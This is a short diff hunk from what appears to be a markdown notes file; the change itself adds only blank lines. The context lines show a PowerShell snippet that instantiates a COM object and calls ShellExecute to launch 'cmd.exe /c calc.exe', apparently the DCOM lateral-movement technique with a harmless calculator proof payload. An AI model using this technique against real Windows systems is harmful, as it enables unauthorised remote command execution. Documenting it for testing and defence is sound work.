@@ -17,3 +17,5 @@ $obj = [System.Activator]::CreateInstance($com)
 $item = $obj.Item()
 $item.Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\windows\system32",$null,0)
 ```
+
+
